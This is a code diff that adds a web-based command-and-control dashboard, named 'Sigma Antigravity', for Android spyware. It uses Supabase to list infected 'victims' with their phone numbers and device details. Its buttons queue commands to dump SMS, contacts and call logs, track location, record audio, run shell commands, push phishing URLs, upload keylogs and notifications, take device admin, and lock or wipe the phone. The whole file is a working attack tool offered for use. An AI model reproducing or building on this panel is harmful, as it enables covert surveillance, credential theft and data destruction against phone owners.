@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sigma Antigravity — C2 Dashboard</title>
+    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0a0a0f;
+            color: #e0e0e0;
+            min-height: 100vh;
+        }
+        .header {
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            padding: 20px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #2a2a4a;
+        }
+        .header h1 {
+            font-size: 22px;
+            color: #00d4ff;
+            letter-spacing: 1px;
+        }
+        .header span {
+            color: #888;
+            font-size: 13px;
+        }
+        .container {
+            padding: 20px 30px;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+        .stats {
+            display: flex;
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+        .stat-card {
+            background: #14142a;
+            padding: 15px 25px;
+            border-radius: 8px;
+            border: 1px solid #2a2a4a;
+            flex: 1;
+            text-align: center;
+        }
+        .stat-card .num {
+            font-size: 28px;
+            font-weight: bold;
+            color: #00d4ff;
+        }
+        .stat-card .label {
+            font-size: 12px;
+            color: #888;
+            margin-top: 4px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .victims-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
+            gap: 16px;
+        }
+        .victim-card {
+            background: #14142a;
+            border-radius: 10px;
+            border: 1px solid #2a2a4a;
+            overflow: hidden;
+            transition: border-color 0.2s;
+        }
+        .victim-card:hover {
+            border-color: #00d4ff;
+        }
+        .victim-card.online {
+            border-left: 3px solid #00d488;
+        }
+        .victim-card.offline {
+            border-left: 3px solid #ff4444;
+        }
+        .victim-header {
+            padding: 14px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: #1a1a30;
+            cursor: pointer;
+        }
+        .victim-header .name {
+            font-size: 15px;
+            font-weight: 600;
+        }
+        .victim-header .status {
+            font-size: 11px;
+            padding: 3px 10px;
+            border-radius: 10px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .status.online { background: #00d48822; color: #00d488; border: 1px solid #00d48844; }
+        .status.offline { background: #ff444422; color: #ff4444; border: 1px solid #ff444444; }
+        .victim-details {
+            padding: 12px 16px;
+            font-size: 12px;
+            color: #aaa;
+            border-bottom: 1px solid #2a2a4a;
+        }
+        .victim-details div {
+            margin: 3px 0;
+        }
+        .victim-details .label {
+            color: #666;
+        }
+        .victim-commands {
+            padding: 12px 16px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 6px;
+        }
+        .victim-commands button {
+            background: #1e1e3a;
+            color: #ccc;
+            border: 1px solid #3a3a5a;
+            padding: 6px 12px;
+            border-radius: 5px;
+            font-size: 11px;
+            cursor: pointer;
+            transition: all 0.15s;
+        }
+        .victim-commands button:hover {
+            background: #00d4ff;
+            color: #000;
+            border-color: #00d4ff;
+        }
+        .victim-commands button.danger:hover {
+            background: #ff4444;
+            color: #fff;
+            border-color: #ff4444;
+        }
+        .victim-commands button.prompt:hover {
+            background: #ffaa00;
+            color: #000;
+            border-color: #ffaa00;
+        }
+        .result-box {
+            margin-top: 8px;
+            padding: 8px 12px;
+            background: #0a0a18;
+            border-radius: 5px;
+            font-family: monospace;
+            font-size: 11px;
+            color: #0d0;
+            max-height: 200px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        .log-container {
+            margin-top: 20px;
+            background: #14142a;
+            border-radius: 10px;
+            border: 1px solid #2a2a4a;
+            padding: 16px;
+        }
+        .log-container h3 {
+            font-size: 14px;
+            color: #888;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        #log {
+            font-family: monospace;
+            font-size: 12px;
+            color: #0d0;
+            max-height: 200px;
+            overflow-y: auto;
+            line-height: 1.5;
+        }
+        #log .error { color: #ff4444; }
+        #log .info { color: #00d4ff; }
+        #log .success { color: #00d488; }
+        .refresh-btn {
+            background: transparent;
+            color: #00d4ff;
+            border: 1px solid #00d4ff44;
+            padding: 8px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 13px;
+        }
+        .refresh-btn:hover {
+            background: #00d4ff22;
+        }
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.7);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-overlay.active {
+            display: flex;
+        }
+        .modal {
+            background: #1a1a2e;
+            border: 1px solid #3a3a5a;
+            border-radius: 10px;
+            padding: 24px;
+            width: 400px;
+            max-width: 90%;
+        }
+        .modal h2 {
+            margin-bottom: 16px;
+            color: #00d4ff;
+        }
+        .modal input {
+            width: 100%;
+            padding: 10px 14px;
+            background: #0a0a18;
+            border: 1px solid #3a3a5a;
+            border-radius: 5px;
+            color: #fff;
+            font-size: 14px;
+            margin-bottom: 12px;
+        }
+        .modal input:focus {
+            outline: none;
+            border-color: #00d4ff;
+        }
+        .modal .btn-row {
+            display: flex;
+            gap: 10px;
+            justify-content: flex-end;
+        }
+        .modal .btn-row button {
+            padding: 8px 20px;
+            border-radius: 5px;
+            border: none;
+            cursor: pointer;
+            font-size: 13px;
+        }
+        .modal .btn-row .cancel {
+            background: #333;
+            color: #ccc;
+        }
+        .modal .btn-row .confirm {
+            background: #00d4ff;
+            color: #000;
+        }
+        @media (max-width: 600px) {
+            .header { flex-direction: column; gap: 8px; text-align: center; }
+            .container { padding: 10px 15px; }
+            .victims-grid { grid-template-columns: 1fr; }
+            .stats { flex-direction: column; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <h1>Σ Sigma Antigravity</h1>
+    <span>Command &amp; Control Dashboard</span>
+</div>
+
+<div class="container">
+    <div class="stats">
+        <div class="stat-card">
+            <div class="num" id="totalCount">0</div>
+            <div class="label">Total Victims</div>
+        </div>
+        <div class="stat-card">
+            <div class="num" id="onlineCount" style="color:#00d488;">0</div>
+            <div class="label">Online</div>
+        </div>
+        <div class="stat-card">
+            <div class="num" id="offlineCount" style="color:#ff4444;">0</div>
+            <div class="label">Offline</div>
+        </div>
+        <div>
+            <button class="refresh-btn" onclick="loadVictims()">↻ Refresh</button>
+        </div>
+    </div>
+
+    <div id="victimsContainer" class="victims-grid">
+        <div style="grid-column:1/-1; text-align:center; padding:40px; color:#666;">
+            Loading victims...
+        </div>
+    </div>
+
+    <div class="log-container">
+        <h3>Event Log</h3>
+        <div id="log">[System] Dashboard initialized. Waiting for data...</div>
+    </div>
+</div>
+
+<!-- Modal for prompts -->
+<div class="modal-overlay" id="promptModal">
+    <div class="modal">
+        <h2 id="modalTitle">Enter value</h2>
+        <input type="text" id="modalInput" placeholder="Value..." />
+        <div class="btn-row">
+            <button class="cancel" onclick="closeModal()">Cancel</button>
+            <button class="confirm" id="modalConfirmBtn">Send</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    // ============================================================
+    // CONFIG — REPLACE WITH YOUR SUPABASE PROJECT DETAILS
+    // ============================================================
+    const SUPABASE_URL = 'https://YOUR_PROJECT_ID.supabase.co';
+    const SUPABASE_ANON_KEY = 'YOUR_ANON_KEY';
+
+    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+    let currentVictims = [];
+    let pendingModalCallback = null;
+
+    function log(msg, type = 'info') {
+        const el = document.getElementById('log');
+        const line = document.createElement('div');
+        line.className = type;
+        const ts = new Date().toLocaleTimeString();
+        line.textContent = `[${ts}] ${msg}`;
+        el.appendChild(line);
+        el.scrollTop = el.scrollHeight;
+    }
+
+    function closeModal() {
+        document.getElementById('promptModal').classList.remove('active');
+        pendingModalCallback = null;
+    }
+
+    function showPrompt(title, callback) {
+        document.getElementById('modalTitle').textContent = title;
+        document.getElementById('modalInput').value = '';
+        document.getElementById('promptModal').classList.add('active');
+        pendingModalCallback = callback;
+        document.getElementById('modalInput').focus();
+    }
+
+    document.getElementById('modalConfirmBtn').addEventListener('click', () => {
+        const val = document.getElementById('modalInput').value;
+        closeModal();
+        if (pendingModalCallback && val) pendingModalCallback(val);
+    });
+
+    document.getElementById('modalInput').addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') document.getElementById('modalConfirmBtn').click();
+    });
+
+    // ============================================================
+    // SEND COMMAND
+    // ============================================================
+    async function sendCommand(victimId, commandType, payload = '') {
+        try {
+            const { error } = await supabase.from('commands').insert({
+                victim_id: victimId,
+                command_type: commandType,
+                payload: payload,
+                status: 'pending'
+            });
+            if (error) {
+                log(`ERROR sending ${commandType}: ${error.message}`, 'error');
+            } else {
+                log(`Sent: ${commandType} ${payload ? '(' + payload.substring(0,40) + ')' : ''}`, 'success');
+            }
+        } catch (e) {
+            log(`ERROR: ${e.message}`, 'error');
+        }
+    }
+
+    function quickCmd(victimId, type, payload = '') {
+        sendCommand(victimId, type, payload);
+    }
+
+    function promptCmd(victimId, type, title) {
+        showPrompt(title, (val) => sendCommand(victimId, type, val));
+    }
+
+    // ============================================================
+    // RENDER VICTIMS
+    // ============================================================
+    function renderVictims(victims) {
+        currentVictims = victims;
+        const container = document.getElementById('victimsContainer');
+
+        if (!victims || victims.length === 0) {
+            container.innerHTML = `
+                <div style="grid-column:1/-1; text-align:center; padding:40px; color:#666;">
+                    No victims registered yet. Deploy the Android app on a device.
+                </div>
+            `;
+            return;
+        }
+
+        const now = Date.now();
+        let online = 0, offline = 0;
+
+        let html = '';
+        victims.forEach(v => {
+            const lastSeen = v.last_seen ? new Date(v.last_seen + 'Z').getTime() : 0;
+            const isOnline = (now - lastSeen) < 120000; // 2 minutes
+            const status = isOnline ? 'online' : 'offline';
+            if (isOnline) online++; else offline++;
+
+            const lastSeenStr = lastSeen ? timeAgo(lastSeen) : 'never';
+
+            html += `
+            <div class="victim-card ${status}">
+                <div class="victim-header" onclick="this.nextElementSibling.nextElementSibling.classList.toggle('hidden')">
+                    <span class="name">${escapeHtml(v.device_name || 'Unknown')}</span>
+                    <span class="status ${status}">${status}</span>
+                </div>
+                <div class="victim-details">
+                    <div><span class="label">ID:</span> ${escapeHtml(v.id || '')}</div>
+                    <div><span class="label">Model:</span> ${escapeHtml(v.device_model || '')}</div>
+                    <div><span class="label">Android:</span> ${escapeHtml(v.android_version || '')}</div>
+                    <div><span class="label">Phone:</span> ${escapeHtml(v.phone_number || 'unknown')}</div>
+                    <div><span class="label">Battery:</span> ${escapeHtml(v.battery_level || '')}</div>
+                    <div><span class="label">Last Seen:</span> ${lastSeenStr}</div>
+                </div>
+                <div class="victim-commands">
+                    <button onclick="quickCmd('${v.id}','vibrate','2000')">Vibrate</button>
+                    <button onclick="quickCmd('${v.id}','dump_sms')">Dump SMS</button>
+                    <button onclick="quickCmd('${v.id}','dump_contacts')">Dump Contacts</button>
+                    <button onclick="quickCmd('${v.id}','dump_call_logs')">Dump Call Logs</button>
+                    <button onclick="quickCmd('${v.id}','get_location')">Get Location</button>
+                    <button class="prompt" onclick="promptCmd('${v.id}','send_sms','Enter number|message:')">Send SMS</button>
+                    <button class="prompt" onclick="promptCmd('${v.id}','shell','Enter shell command:')">Shell</button>
+                    <button onclick="quickCmd('${v.id}','list_files')">List Files</button>
+                    <button onclick="quickCmd('${v.id}','list_apps')">List Apps</button>
+                    <button onclick="quickCmd('${v.id}','system_info')">System Info</button>
+                    <button class="prompt" onclick="promptCmd('${v.id}','record_audio','Duration (seconds):')">Record Audio</button>
+                    <button onclick="quickCmd('${v.id}','stop_recording')">Stop Recording</button>
+                    <button class="prompt" onclick="promptCmd('${v.id}','play_music','Music URL:')">Play Music</button>
+                    <button onclick="quickCmd('${v.id}','stop_music')">Stop Music</button>
+                    <button class="prompt" onclick="promptCmd('${v.id}','text_to_speech','Text to speak:')">Text To Speech</button>
+                    <button class="prompt" onclick="promptCmd('${v.id}','change_wallpaper','Image URL:')">Change Wallpaper</button>
+                    <button class="prompt" onclick="promptCmd('${v.id}','toast','Toast message:')">Toast</button>
+                    <button class="prompt" onclick="promptCmd('${v.id}','open_url','URL:')">Open URL</button>
+                    <button class="prompt" onclick="promptCmd('${v.id}','open_phishing','Phishing URL:')">Open Phishing</button>
+                    <button onclick="quickCmd('${v.id}','upload_keylog')">Upload Keylog</button>
+                    <button onclick="quickCmd('${v.id}','upload_notifications')">Upload Notifications</button>
+                    <button onclick="quickCmd('${v.id}','enable_admin')">Enable Admin</button>
+                    <button onclick="quickCmd('${v.id}','lock_device')">Lock Device</button>
+                    <button class="danger" onclick="quickCmd('${v.id}','wipe_device')">⚠️ Wipe</button>
+                </div>
+            </div>
+            `;
+        });
+
+        container.innerHTML = html;
+        document.getElementById('totalCount').textContent = victims.length;
+        document.getElementById('onlineCount').textContent = online;
+        document.getElementById('offlineCount').textContent = offline;
+    }
+
+    function timeAgo(ts) {
+        const diff = Date.now() - ts;
+        if (diff < 60000) return 'just now';
+        const mins = Math.floor(diff / 60000);
+        if (mins < 60) return mins + 'm ago';
+        const hrs = Math.floor(mins / 60);
+        if (hrs < 24) return hrs + 'h ago';
+        return Math.floor(hrs / 24) + 'd ago';
+    }
+
+    function escapeHtml(str) {
+        if (!str) return '';
+        return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+    }
+
+    // ============================================================
+    // LOAD VICTIMS
+    // ============================================================
+    async function loadVictims() {
+        try {
+            const { data, error } = await supabase
+                .from('victims')
+                .select('*')
+                .order('last_seen', { ascending: false });
+
+            if (error) {
+                log(`Load error: ${error.message}`, 'error');
+                return;
+            }
+            renderVictims(data || []);
+            log(`Loaded ${(data||[]).length} victims`, 'info');
+        } catch (e) {
+            log(`Load error: ${e.message}`, 'error');
+        }
+    }
+
+    // ============================================================
+    // REAL-TIME SUBSCRIPTIONS
+    // ============================================================
+    function subscribeToRealtime() {
+        // Listen for new/updated victims
+        const victimsChannel = supabase
+            .channel('victims-changes')
+            .on('postgres_changes',
+                { event: '*', schema: 'public', table: 'victims' },
+                (payload) => {
+                    log(`Victim ${payload.eventType}: ${payload.new?.device_name || payload.old?.device_name || ''}`, 'info');
+                    loadVictims();
+                }
+            )
+            .subscribe((status) => {
+                log(`Victims subscription: ${status}`, status === 'SUBSCRIBED' ? 'success' : 'info');
+            });
+
+        // Listen for completed commands (show results)
+        const commandsChannel = supabase
+            .channel('commands-results')
+            .on('postgres_changes',
+                { event: 'UPDATE', schema: 'public', table: 'commands', filter: 'status=eq.completed' },
+                (payload) => {
+                    const cmd = payload.new;
+                    if (cmd.result && cmd.result.length > 0) {
+                        log(`Result [${cmd.command_type}]: ${cmd.result.substring(0, 200)}`, 'success');
+                    }
+                }
+            )
+            .subscribe();
+
+        // Clean up on page unload
+        window.addEventListener('beforeunload', () => {
+            supabase.removeChannel(victimsChannel);
+            supabase.removeChannel(commandsChannel);
+        });
+    }
+
+    // ============================================================
+    // INIT
+    // ============================================================
+    loadVictims();
+    subscribeToRealtime();
+
+    // Refresh victims list every 15 seconds
+    setInterval(loadVictims, 15000);
+</script>
+
+</body>
+</html>
